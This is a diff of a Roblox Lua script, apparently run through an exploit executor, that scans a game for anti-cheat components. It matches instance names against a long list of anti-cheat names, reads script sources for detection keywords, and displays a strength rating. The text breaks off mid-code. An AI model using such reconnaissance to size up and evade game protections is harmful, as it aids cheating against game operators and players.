@@ -1,20 +1,27 @@
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Warning",
-    Text = "This May Not Be That Extremely Accurate",
-    Duration= "5";
+    Title = "Game Detected",
+    Text = "Game has been detected...",
+    Duration = 5
 })
-
-task.wait(5)
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Started..",
-    Text = "Game Detected",
-    Duration= "5";
+    Title = "AntiCheat Scanner",
+    Text = "Initializing advanced detection system...",
+    Duration = 5
 })
+
+task.wait(3)
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "⚠️Warning",
+    Text = "This Might Not Be That Accurate",
+    Duration = 5
+})
+
 
 -- Create the main GUI frame
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "AntiCheatScanner"
+screenGui.Name = "AdvancedAntiCheatScanner"
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- Detect platform (PC or Mobile)
@@ -22,33 +29,51 @@ local isMobile = game:GetService("UserInputService").TouchEnabled
 local isPC = not isMobile
 
 -- Set sizes based on platform
-local guiWidth, guiHeight = isPC and 450 or 300, isPC and 300 or 200
-local wavePointDensity = isPC and 1.5 or 2.5
-local counterFontSize, acFontSize = isPC and 18 or 14, isPC and 18 or 14
+local guiWidth, guiHeight = isPC and 500 or 350, isPC and 350 or 250
+local wavePointDensity = isPC and 1.2 or 2
+local counterFontSize, acFontSize = isPC and 20 or 16, isPC and 20 or 16
 
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, guiWidth, 0, guiHeight)
 frame.Position = UDim2.new(0.5, -guiWidth/2, 0.5, -guiHeight/2)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 frame.BorderSizePixel = 0
 frame.ClipsDescendants = true
 frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
 
+-- Add subtle gradient
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 45)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
+})
+gradient.Rotation = 90
+gradient.Parent = frame
+
 -- Close button
 local closeButton = Instance.new("TextButton")
-closeButton.Size = UDim2.new(0, 20, 0, 20)
-closeButton.Position = UDim2.new(1, -25, 0, 5)
-closeButton.Text = "X"
-closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeButton.Size = UDim2.new(0, 25, 0, 25)
+closeButton.Position = UDim2.new(1, -30, 0, 5)
+closeButton.Text = "×"
+closeButton.TextColor3 = Color3.fromRGB(0, 255, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+closeButton.BackgroundTransparency = 1
 closeButton.BorderSizePixel = 0
-closeButton.Font = Enum.Font.SourceSansBold
-closeButton.TextSize = 14
+closeButton.Font = Enum.Font.GothamBold
+closeButton.TextSize = 20
 closeButton.ZIndex = 2
 closeButton.Parent = frame
+
+closeButton.MouseEnter:Connect(function()
+    closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+end)
+
+closeButton.MouseLeave:Connect(function()
+    closeButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+end)
 
 closeButton.MouseButton1Click:Connect(function()
     screenGui:Destroy()
@@ -56,24 +81,24 @@ end)
 
 -- Get game name
 local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-if #gameName > 20 then
-    gameName = string.sub(gameName, 1, 17).."..."
+if #gameName > 25 then
+    gameName = string.sub(gameName, 1, 22).."..."
 end
 
 -- Header with AC info
 local header = Instance.new("Frame")
-header.Size = UDim2.new(1, -40, 0, 25)
-header.Position = UDim2.new(0, 5, 0, 5)
+header.Size = UDim2.new(1, -40, 0, 30)
+header.Position = UDim2.new(0, 20, 0, 10)
 header.BackgroundTransparency = 1
 header.Parent = frame
 
 local acLabel = Instance.new("TextLabel")
 acLabel.Size = UDim2.new(0.6, 0, 1, 0)
 acLabel.Position = UDim2.new(0, 0, 0, 0)
-acLabel.Text = "scanning AC... | "..gameName
-acLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+acLabel.Text = "SCANNING... | "..gameName
+acLabel.TextColor3 = Color3.fromRGB(200, 200, 0)
 acLabel.BackgroundTransparency = 1
-acLabel.Font = Enum.Font.SourceSansBold
+acLabel.Font = Enum.Font.GothamBold
 acLabel.TextSize = acFontSize
 acLabel.TextXAlignment = Enum.TextXAlignment.Left
 acLabel.TextTruncate = Enum.TextTruncate.AtEnd
@@ -82,44 +107,77 @@ acLabel.Parent = header
 local counterLabel = Instance.new("TextLabel")
 counterLabel.Size = UDim2.new(0.4, 0, 1, 0)
 counterLabel.Position = UDim2.new(0.6, 0, 0, 0)
-counterLabel.Text = "[00.0]"
-counterLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+counterLabel.Text = "m[00.00%]      "
+counterLabel.TextColor3 = Color3.fromRGB(200, 200, 0)
 counterLabel.BackgroundTransparency = 1
-counterLabel.Font = Enum.Font.SourceSansBold
+counterLabel.Font = Enum.Font.GothamBold
 counterLabel.TextSize = counterFontSize
 counterLabel.TextXAlignment = Enum.TextXAlignment.Right
 counterLabel.Parent = header
 
 -- Canvas for the visualization
 local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, -10, 1, -40)
-canvas.Position = UDim2.new(0, 5, 0, 35)
-canvas.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+canvas.Size = UDim2.new(1, -20, 0, 150)
+canvas.Position = UDim2.new(0, 10, 0, 50)
+canvas.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
 canvas.BorderSizePixel = 0
 canvas.Parent = frame
 
--- List of common AntiCheat names to detect
+-- Add grid pattern to canvas
+local gridPattern = Instance.new("Frame")
+gridPattern.Size = UDim2.new(1, 0, 1, 0)
+gridPattern.BackgroundTransparency = 1
+gridPattern.Parent = canvas
+
+for i = 0, 10 do
+    local line = Instance.new("Frame")
+    line.Size = UDim2.new(0, 1, 1, 0)
+    line.Position = UDim2.new(0, i * (canvas.AbsoluteSize.X / 10), 0, 0)
+    line.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    line.BorderSizePixel = 0
+    line.Parent = gridPattern
+    
+    local lineH = Instance.new("Frame")
+    lineH.Size = UDim2.new(1, 0, 0, 1)
+    lineH.Position = UDim2.new(0, 0, 0, i * (canvas.AbsoluteSize.Y / 10))
+    lineH.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    lineH.BorderSizePixel = 0
+    lineH.Parent = gridPattern
+end
+
+-- List of common AntiCheat names and patterns to detect (expanded list)
 local commonACNames = {
-    "AntiCheat", "AntiExploitScript", "AC_", "SecurityModule",
-    "AntiHack", "ExploitProtection", "CheatDetection", "HackShield",
-    "VAC", "MoonSec", "SimpleSpy", "Synapse", "Kick", "Ban",
-    "AntiExploit", "ExploitDetection", "HackDetection", "AntiInject",
-    "ScriptProtection", "ScriptShield", "AntiTamper", "MemoryProtect"
+    "AntiCheat", "AntiExploit", "AC_", "SecurityModule", "AntiHack", 
+    "ExploitProtection", "CheatDetection", "HackShield", "VAC", "MoonSec", 
+    "SimpleSpy", "Synapse", "Kick", "Ban", "AntiExploit", "ExploitDetection", 
+    "HackDetection", "AntiInject", "ScriptProtection", "ScriptShield", 
+    "AntiTamper", "MemoryProtect", "Badger", "Guardian", "Sentinel", 
+    "Watchdog", "Defender", "Shield", "Protector", "DarkStar", "Elysian", 
+    "Vanguard", "FairFight", "EasyAntiCheat", "BattlEye", "Nexus", 
+    "Polaris", "CheatEngine", "CheatPunch", "GameGuard", "XignCode", 
+    "nProtect", "HSHIELD", "PunkBuster", "Equ8", "Ricochet", "VACnet", 
+    "FAC", "SAC", "Warden", "Denuvo", "Arbiter", "Obsidian", "Titan", 
+    "Aegis", "Fortify", "Bulwark", "RiotShield", "Ironclad", "Sentry", 
+    "Valkyrie", "Hyperion", "Artemis", "Apollo", "Athena", "Zeus", 
+    "Odin", "Thor", "Fenrir", "Jormungandr", "Typhon", "Cerberus"
 }
 
--- Enhanced AntiCheat detection function
+-- Enhanced AntiCheat detection function with more thorough checks
 local function detectAntiCheat()
     local foundAC = {}
     local acStrength = 0
     local totalPossibleStrength = 0
     
-    -- Check all game services for AC components
+    -- Services to check for AC components
     local servicesToCheck = {
         game:GetService("ReplicatedStorage"),
         game:GetService("ServerScriptService"),
         game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts"),
         game:GetService("Workspace"),
-        game:GetService("Lighting")
+        game:GetService("Lighting"),
+        game:GetService("StarterPlayer").StarterPlayerScripts,
+        game:GetService("StarterPack"),
+        game:GetService("StarterGui")
     }
     
     -- Check for specific AC names and components
@@ -128,24 +186,53 @@ local function detectAntiCheat()
             for _, acName in ipairs(commonACNames) do
                 if string.find(string.lower(item.Name), string.lower(acName)) then
                     local strength = 1 -- Base strength
+                    local detectionType = "Name Match"
                     
                     -- Increase strength for certain components
-                    if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
-                        strength = strength + 2
-                    elseif item:IsA("Script") or item:IsA("ModuleScript") then
+                    if item:IsA("RemoteEvent") then
                         strength = strength + 3
+                        detectionType = "RemoteEvent"
+                    elseif item:IsA("RemoteFunction") then
+                        strength = strength + 4
+                        detectionType = "RemoteFunction"
+                    elseif item:IsA("Script") then
+                        strength = strength + 2
+                        detectionType = "Script"
+                    elseif item:IsA("ModuleScript") then
+                        strength = strength + 3
+                        detectionType = "ModuleScript"
                     elseif item:IsA("BindableEvent") or item:IsA("BindableFunction") then
-                        strength = strength + 1
+                        strength = strength + 1.5
+                        detectionType = "Bindable"
+                    elseif item:IsA("LocalScript") then
+                        strength = strength + 1.5
+                        detectionType = "LocalScript"
+                    end
+                    
+                    -- Check for obfuscated scripts
+                    if item:IsA("Script") or item:IsA("LocalScript") or item:IsA("ModuleScript") then
+                        local source = ""
+                        pcall(function()
+                            source = item.Source
+                        end)
+                        
+                        if source and (string.find(source, "getfenv") or string.find(source, "setfenv") or 
+                           string.find(source, "loadstring") or string.find(source, "bytecode") or
+                           string.find(source, "xor") or string.find(source, "encrypt")) then
+                            strength = strength + 2
+                            detectionType = detectionType.." | Obfuscated"
+                        end
                     end
                     
                     table.insert(foundAC, {
                         name = item.Name,
                         path = item:GetFullName(),
                         type = item.ClassName,
-                        strength = strength
+                        strength = strength,
+                        detection = detectionType
                     })
                     acStrength = acStrength + strength
-                    totalPossibleStrength = totalPossibleStrength + 5 -- Max per item
+                    totalPossibleStrength = totalPossibleStrength + 6 -- Max per item
                 end
             end
         end
@@ -162,10 +249,11 @@ local function detectAntiCheat()
                         name = v.Name,
                         path = "Hidden Instance",
                         type = v.ClassName,
-                        strength = 5 -- High strength for hidden AC
+                        strength = 6, -- Highest strength for hidden AC
+                        detection = "Hidden Instance"
                     })
-                    acStrength = acStrength + 5
-                    totalPossibleStrength = totalPossibleStrength + 5
+                    acStrength = acStrength + 6
+                    totalPossibleStrength = totalPossibleStrength + 6
                 end
             end
         end
@@ -180,10 +268,60 @@ local function detectAntiCheat()
                 name = "Memory Protection",
                 path = "Game Stats",
                 type = "System",
-                strength = 4
+                strength = 5,
+                detection = "Memory Protection"
             })
-            acStrength = acStrength + 4
-            totalPossibleStrength = totalPossibleStrength + 5
+            acStrength = acStrength + 5
+            totalPossibleStrength = totalPossibleStrength + 6
+        end
+    end)
+    
+    -- Check for unusual script behavior
+    pcall(function()
+        local scripts = game:GetService("ScriptContext"):GetScripts()
+        for _, script in ipairs(scripts) do
+            if script.ClassName == "LocalScript" and script:IsDescendantOf(game:GetService("Players").LocalPlayer) == false then
+                table.insert(foundAC, {
+                    name = "Suspicious LocalScript",
+                    path = script:GetFullName(),
+                    type = "LocalScript",
+                    strength = 4,
+                    detection = "Unusual Behavior"
+                })
+                acStrength = acStrength + 4
+                totalPossibleStrength = totalPossibleStrength + 6
+            end
+        end
+    end)
+    
+    -- Check for known exploit detection patterns
+    pcall(function()
+        local players = game:GetService("Players")
+        if players:FindFirstChild("LocalPlayer") then
+            local playerScripts = players.LocalPlayer:FindFirstChild("PlayerScripts")
+            if playerScripts then
+                for _, script in ipairs(playerScripts:GetDescendants()) do
+                    if script:IsA("LocalScript") then
+                        local source = ""
+                        pcall(function()
+                            source = script.Source
+                        end)
+                        
+                        if source and (string.find(source, "exploit") or string.find(source, "cheat") or 
+                           string.find(source, "inject") or string.find(source, "hook")) then
+                            table.insert(foundAC, {
+                                name = "Exploit Detection",
+                                path = script:GetFullName(),
+                                type = "LocalScript",
+                                strength = 5,
+                                detection = "Pattern Match"
+                            })
+                            acStrength = acStrength + 5
+                            totalPossibleStrength = totalPossibleStrength + 6
+                        end
+                    end
+                end
+            end
         end
     end)
     
@@ -192,20 +330,20 @@ local function detectAntiCheat()
     local acLevel, acColor
     
     if #foundAC == 0 then
-        acLevel = "None"
-        acColor = Color3.fromRGB(255, 0, 0) -- Red
-    elseif acPercentage < 30 then
-        acLevel = "Weak"
+        acLevel = "NONE"
+        acColor = Color3.fromRGB(255, 50, 50) -- Red
+    elseif acPercentage < 25 then
+        acLevel = "LOW"
         acColor = Color3.fromRGB(255, 165, 0) -- Orange
-    elseif acPercentage < 60 then
-        acLevel = "Medium"
+    elseif acPercentage < 50 then
+        acLevel = "MEDIUM"
         acColor = Color3.fromRGB(255, 255, 0) -- Yellow
-    elseif acPercentage < 85 then
-        acLevel = "Strong"
-        acColor = Color3.fromRGB(0, 255, 0) -- Green
+    elseif acPercentage < 75 then
+        acLevel = "HIGH"
+        acColor = Color3.fromRGB(50, 255, 50) -- Green
     else
-        acLevel = "Extreme"
-        acColor = Color3.fromRGB(0, 0, 255) -- Blue
+        acLevel = "EXTREME"
+        acColor = Color3.fromRGB(150, 50, 255) -- Purple
     end
     
     return {
@@ -215,192 +353,500 @@ local function detectAntiCheat()
         percentage = acPercentage,
         color = acColor,
         foundAC = foundAC,
-        components = #foundAC
+        components = #foundAC,
+        lastUpdate = os.time()
     }
 end
 
--- Run AntiCheat detection
+-- Run initial AntiCheat detection
 local acData = detectAntiCheat()
 local acLevel = acData.level
 local acColor = acData.color
 
 -- Update label with AC info
-acLabel.Text = acLevel.." AC ("..math.floor(acData.percentage).."%) | "..gameName
+acLabel.Text = acLevel.." AC | "..math.floor(acData.percentage).."% | "..gameName
 acLabel.TextColor3 = acColor
 
 -- Set parameters based on AC level
-local frequency, amplitude, speed, counterSpeed
-if acLevel == "None" then
-    frequency = 0
-    amplitude = 0
-    speed = 0
-    counterSpeed = 0.1
-elseif acLevel == "Weak" then
+local frequency, amplitude, speed, counterSpeed, randomness
+if acLevel == "NONE" then
     frequency = 0.5
-    amplitude = isPC and 40 or 30
-    speed = 0.5
+    amplitude = isPC and 20 or 15
+    speed = 0.3
     counterSpeed = 0.5
-elseif acLevel == "Medium" then
+    randomness = 0
+elseif acLevel == "LOW" then
     frequency = 1
-    amplitude = isPC and 60 or 40
-    speed = 1
-    counterSpeed = 1
-elseif acLevel == "Strong" then
+    amplitude = isPC and 40 or 30
+    speed = 0.8
+    counterSpeed = 0.8
+    randomness = 0.2
+elseif acLevel == "MEDIUM" then
     frequency = 1.5
-    amplitude = isPC and 80 or 50
-    speed = 1.5
-    counterSpeed = 1.5
-else -- Extreme
+    amplitude = isPC and 60 or 40
+    speed = 1.2
+    counterSpeed = 1.2
+    randomness = 0.4
+elseif acLevel == "HIGH" then
     frequency = 2
+    amplitude = isPC and 80 or 50
+    speed = 1.6
+    counterSpeed = 1.6
+    randomness = 0.6
+else -- EXTREME
+    frequency = 2.5
     amplitude = isPC and 100 or 60
     speed = 2
     counterSpeed = 2
+    randomness = 0.8
 end
 
--- Visualization drawing function
+-- Smoother visualization drawing function
+local lastPoints = {}
 local function drawVisualization(time)
     local width = canvas.AbsoluteSize.X
     local height = canvas.AbsoluteSize.Y
     local centerY = height / 2
     
-    -- Clear previous drawings
+    -- Clear previous drawings but keep grid
     for _, child in ipairs(canvas:GetChildren()) do
-        if child:IsA("Frame") then
+        if child:IsA("Frame") and child ~= gridPattern then
             child:Destroy()
         end
     end
     
-    if acLevel == "None" then
-        -- Draw straight line for no AC
+    if acLevel == "NONE" then
+        -- Draw flat line with slight noise for no AC
         for x = 0, width, wavePointDensity do
-            local point = Instance.new("Frame")
-            point.Size = UDim2.new(0, 2, 0, 2)
-            point.Position = UDim2.new(0, x, 0, centerY - 1)
-            point.BackgroundColor3 = acColor
-            point.BorderSizePixel = 0
-            point.Parent = canvas
-        end
-    else
-        -- Draw dynamic visualization based on AC strength
-        for x = 0, width, wavePointDensity do
-            local normalizedX = x / width * 2 * math.pi
-            local y = centerY + math.sin(normalizedX * frequency + time * speed) * amplitude
-            
-            -- Add some randomness for stronger AC
-            if acLevel == "Strong" or acLevel == "Extreme" then
-                y = y + math.random(-5, 5)
-            end
-            
+            local y = centerY + math.random(-3, 3)
             local point = Instance.new("Frame")
             point.Size = UDim2.new(0, 2, 0, 2)
             point.Position = UDim2.new(0, x, 0, y - 1)
             point.BackgroundColor3 = acColor
             point.BorderSizePixel = 0
+            point.ZIndex = 2
             point.Parent = canvas
         end
-        
-        -- Add extra effects for extreme AC
-        if acLevel == "Extreme" then
-            for i = 1, 3 do
-                local sparkX = math.random(0, width)
-                local sparkY = math.random(0, height)
-                local spark = Instance.new("Frame")
-                spark.Size = UDim2.new(0, 3, 0, 3)
-                spark.Position = UDim2.new(0, sparkX, 0, sparkY)
-                spark.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
-                spark.BorderSizePixel = 0
-                spark.Parent = canvas
+    else
+        -- Create smoother wave by interpolating between points
+        local points = {}
+        for x = 0, width, wavePointDensity do
+            -- Base sine wave
+            local normalizedX = x / width * 2 * math.pi
+            local baseY = math.sin(normalizedX * frequency + time * speed) * amplitude
+            
+            -- Add secondary wave for complexity
+            local secondaryY = math.sin(normalizedX * frequency * 1.3 + time * speed * 1.7) * (amplitude * 0.3)
+            
+            -- Add controlled randomness based on AC level
+            local randomY = math.random(-amplitude * randomness, amplitude * randomness) * 0.5
+            if lastPoints[x] then
+                randomY = (randomY + lastPoints[x].randomY) / 2 -- Average with previous frame
             end
+            
+            -- Combine all effects
+            local y = centerY + baseY + secondaryY + randomY
+            
+            -- Store point data for smoothing
+            points[x] = {
+                x = x,
+                y = y,
+                randomY = randomY
+            }
+        end
+        
+        -- Draw smoothed wave
+        for x, pointData in pairs(points) do
+            -- Create point with color variation
+            local point = Instance.new("Frame")
+            point.Size = UDim2.new(0, 3, 0, 3)
+            point.Position = UDim2.new(0, x, 0, pointData.y - 1.5)
+            
+            -- Smoother color variation
+            local colorVariation = math.sin(time * 0.5 + x * 0.01) * 0.2
+            point.BackgroundColor3 = Color3.new(
+                math.clamp(acColor.R + colorVariation, 0, 1),
+                math.clamp(acColor.G + colorVariation * 0.5, 0, 1),
+                math.clamp(acColor.B - colorVariation * 0.2, 0, 1)
+            )
+            
+            point.BorderSizePixel = 0
+            point.ZIndex = 2
+            point.Parent = canvas
+            
+            -- Add occasional sparkles for high/extreme AC
+            if (acLevel == "HIGH" or acLevel == "EXTREME") and math.random() < 0.02 then
+                local sparkle = Instance.new("Frame")
+                sparkle.Size = UDim2.new(0, 4, 0, 4)
+                sparkle.Position = UDim2.new(0, x + math.random(-5, 5), 0, pointData.y + math.random(-5, 5))
+                sparkle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                sparkle.BorderSizePixel = 0
+                sparkle.ZIndex = 3
+                sparkle.Parent = canvas
+                
+                -- Animate sparkle
+                game:GetService("TweenService"):Create(
+                    sparkle,
+                    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                    {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}
+                ):Play()
+                
+                delay(0.3, function()
+                    if sparkle then
+                        sparkle:Destroy()
+                    end
+                end)
+            end
+        end
+        
+        -- Store points for next frame smoothing
+        lastPoints = points
+        
+        -- Add pulse effect for extreme AC
+        if acLevel == "EXTREME" and math.random() < 0.05 then
+            local pulse = Instance.new("Frame")
+            pulse.Size = UDim2.new(0, 0, 0, 0)
+            pulse.Position = UDim2.new(0.5, 0, 0.5, 0)
+            pulse.AnchorPoint = Vector2.new(0.5, 0.5)
+            pulse.BackgroundColor3 = Color3.fromRGB(255, 50, 255)
+            pulse.BackgroundTransparency = 0.7
+            pulse.BorderSizePixel = 0
+            pulse.ZIndex = 1
+            pulse.Parent = canvas
+            
+            game:GetService("TweenService"):Create(
+                pulse,
+                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1}
+            ):Play()
+            
+            delay(1, function()
+                if pulse then
+                    pulse:Destroy()
+                end
+            end)
         end
     end
 end
 
--- Counter update function
+-- Counter update function with realistic progression
+local lastCounterUpdate = 0
+local currentPercentage = 0
+local targetPercentage = acData.percentage
+
 local function updateCounter(time)
-    -- Generate random number between 0 and 99.9
-    local randomValue = math.floor(math.random() * 1000) / 10
-    -- Format with leading zero if needed
-    local formattedValue = string.format("[%05.1f]", randomValue)
-    counterLabel.Text = formattedValue
+    if time - lastCounterUpdate > (1 / counterSpeed) then
+        -- Smoothly approach the target percentage
+        if currentPercentage < targetPercentage then
+            currentPercentage = math.min(currentPercentage + (math.random() * 5), targetPercentage)
+        else
+            currentPercentage = math.max(currentPercentage - (math.random() * 2), targetPercentage)
+        end
+        
+        -- Add small random fluctuations
+        currentPercentage = currentPercentage + math.random(-0.5, 0.5)
+        currentPercentage = math.clamp(currentPercentage, 0, 100)
+        
+        counterLabel.Text = string.format("[%.2f%%]", currentPercentage)
+        lastCounterUpdate = time
+    end
 end
 
 -- Animation loop
 local heartbeatConnection
-local lastCounterUpdate = 0
 heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function(step)
     local time = tick()
     drawVisualization(time)
-    
-    -- Update counter at different rates based on AC level
-    if time - lastCounterUpdate > (1 / counterSpeed) then
-        updateCounter(time)
-        lastCounterUpdate = time
-    end
+    updateCounter(time)
 end)
 
--- Add details button
-local detailsButton = Instance.new("TextButton")
-detailsButton.Size = UDim2.new(0, 100, 0, 25)
-detailsButton.Position = UDim2.new(0.5, -50, 1, -30)
-detailsButton.Text = "AC Components ("..acData.components..")"
-detailsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-detailsButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-detailsButton.BorderSizePixel = 0
-detailsButton.Font = Enum.Font.SourceSansBold
-detailsButton.TextSize = 14
-detailsButton.Parent = frame
+local dropdownFrame = Instance.new("Frame")
+dropdownFrame.Size = UDim2.new(1, -20, 0, 30)
+dropdownFrame.Position = UDim2.new(0, 10, 0, 210)
+dropdownFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+dropdownFrame.BorderSizePixel = 0
+dropdownFrame.ClipsDescendants = true  -- Add this to prevent content from overflowing
+dropdownFrame.Parent = frame
 
--- Details frame
-local detailsFrame = Instance.new("Frame")
-detailsFrame.Size = UDim2.new(1, -20, 0, 150)
-detailsFrame.Position = UDim2.new(0, 10, 1, 10)
-detailsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-detailsFrame.BorderSizePixel = 0
-detailsFrame.Visible = false
-detailsFrame.Parent = frame
+local dropdownButton = Instance.new("TextButton")
+dropdownButton.Size = UDim2.new(1, 0, 1, 0)
+dropdownButton.Text = "Detected AC Components ("..acData.components..")"
+dropdownButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dropdownButton.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+dropdownButton.BorderSizePixel = 0
+dropdownButton.Font = Enum.Font.GothamBold
+dropdownButton.TextSize = 14
+dropdownButton.Parent = dropdownFrame
 
-local detailsScroll = Instance.new("ScrollingFrame")
-detailsScroll.Size = UDim2.new(1, -10, 1, -10)
-detailsScroll.Position = UDim2.new(0, 5, 0, 5)
-detailsScroll.BackgroundTransparency = 1
-detailsScroll.ScrollBarThickness = 5
-detailsScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-detailsScroll.Parent = detailsFrame
+-- Calculate maximum height based on available space (frame height - current position - padding)
+local maxDropdownHeight = guiHeight - 240  -- 210 position + 30 button height + some padding
 
-local detailsText = ""
-if #acData.foundAC > 0 then
-    for i, ac in ipairs(acData.foundAC) do
-        detailsText = detailsText .. string.format("%d. %s (%s) - %s\n", i, ac.name, ac.type, ac.path)
+local dropdownContent = Instance.new("ScrollingFrame")
+dropdownContent.Size = UDim2.new(1, 0, 0, 0)
+dropdownContent.Position = UDim2.new(0, 0, 1, 0)
+dropdownContent.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+dropdownContent.BorderSizePixel = 0
+dropdownContent.ScrollBarThickness = 5
+dropdownContent.AutomaticCanvasSize = Enum.AutomaticSize.Y
+dropdownContent.ScrollingDirection = Enum.ScrollingDirection.Y
+dropdownContent.Visible = false
+dropdownContent.Parent = dropdownFrame
+
+local dropdownListLayout = Instance.new("UIListLayout")
+dropdownListLayout.Padding = UDim.new(0, 1)
+dropdownListLayout.Parent = dropdownContent
+
+-- Populate dropdown with detected AC components
+local function populateDropdown()
+    for _, child in ipairs(dropdownContent:GetChildren()) do
+        if child:IsA("Frame") then
+            child:Destroy()
+        end
     end
-else
-    detailsText = "No AntiCheat components found"
+
+    if #acData.foundAC == 0 then
+        local noACLabel = Instance.new("TextLabel")
+        noACLabel.Size = UDim2.new(1, 0, 0, 30)
+        noACLabel.Text = "No Anti-Cheat components detected"
+        noACLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+        noACLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+        noACLabel.BorderSizePixel = 0
+        noACLabel.Font = Enum.Font.Gotham
+        noACLabel.TextSize = 14
+        noACLabel.Parent = dropdownContent
+    else
+        -- Sort by strength (highest first)
+        table.sort(acData.foundAC, function(a, b)
+            return a.strength > b.strength
+        end)
+        
+        for i, ac in ipairs(acData.foundAC) do
+            local acEntry = Instance.new("Frame")
+            acEntry.Size = UDim2.new(1, 0, 0, 40)
+            acEntry.BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(35, 35, 50) or Color3.fromRGB(30, 30, 45)
+            acEntry.BorderSizePixel = 0
+            acEntry.Parent = dropdownContent
+            
+            local nameLabel = Instance.new("TextLabel")
+            nameLabel.Size = UDim2.new(0.7, 0, 0.5, 0)
+            nameLabel.Position = UDim2.new(0, 5, 0, 0)
+            nameLabel.Text = ac.name
+            nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            nameLabel.BackgroundTransparency = 1
+            nameLabel.Font = Enum.Font.Gotham
+            nameLabel.TextSize = 14
+            nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
+            nameLabel.Parent = acEntry
+            
+            local typeLabel = Instance.new("TextLabel")
+            typeLabel.Size = UDim2.new(0.3, -5, 0.5, 0)
+            typeLabel.Position = UDim2.new(0.7, 0, 0, 0)
+            typeLabel.Text = ac.type
+            typeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            nameLabel.BackgroundTransparency = 1
+            typeLabel.Font = Enum.Font.Gotham
+            typeLabel.TextSize = 12
+            typeLabel.TextXAlignment = Enum.TextXAlignment.Right
+            typeLabel.Parent = acEntry
+            
+            local pathLabel = Instance.new("TextLabel")
+            pathLabel.Size = UDim2.new(1, -10, 0.5, 0)
+            pathLabel.Position = UDim2.new(0, 5, 0.5, 0)
+            pathLabel.Text = ac.path
+            pathLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+            pathLabel.BackgroundTransparency = 1
+            pathLabel.Font = Enum.Font.Gotham
+            pathLabel.TextSize = 12
+            pathLabel.TextXAlignment = Enum.TextXAlignment.Left
+            pathLabel.TextTruncate = Enum.TextTruncate.AtEnd
+            pathLabel.Parent = acEntry
+            
+            local strengthBar = Instance.new("Frame")
+            strengthBar.Size = UDim2.new(0, 0, 0, 3)
+            strengthBar.Position = UDim2.new(0, 0, 1, -3)
+            strengthBar.BackgroundColor3 = Color3.fromHSV(0.3 * (1 - (ac.strength / 6)), 1, 1)
+            strengthBar.BorderSizePixel = 0
+            strengthBar.Parent = acEntry
+            
+            -- Animate strength bar
+            game:GetService("TweenService"):Create(
+                strengthBar,
+                TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {Size = UDim2.new(ac.strength / 6, 0, 0, 3)}
+            ):Play()
+        end
+    end
+    
+    -- Update canvas size after populating
+    dropdownContent.CanvasSize = UDim2.new(0, 0, 0, dropdownListLayout.AbsoluteContentSize.Y)
 end
 
-local detailsLabel = Instance.new("TextLabel")
-detailsLabel.Size = UDim2.new(1, -10, 0, #acData.foundAC * 20 + 20)
-detailsLabel.Position = UDim2.new(0, 5, 0, 5)
-detailsLabel.Text = detailsText
-detailsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-detailsLabel.BackgroundTransparency = 1
-detailsLabel.Font = Enum.Font.SourceSans
-detailsLabel.TextSize = 14
-detailsLabel.TextXAlignment = Enum.TextXAlignment.Left
-detailsLabel.TextYAlignment = Enum.TextYAlignment.Top
-detailsLabel.Parent = detailsScroll
+populateDropdown()
 
-detailsScroll.CanvasSize = UDim2.new(0, 0, 0, detailsLabel.AbsoluteContentSize.Y + 10)
+-- Improved dropdown toggle with animation
+local dropdownOpen = false
+local dropdownTween
 
--- Toggle details
-detailsButton.MouseButton1Click:Connect(function()
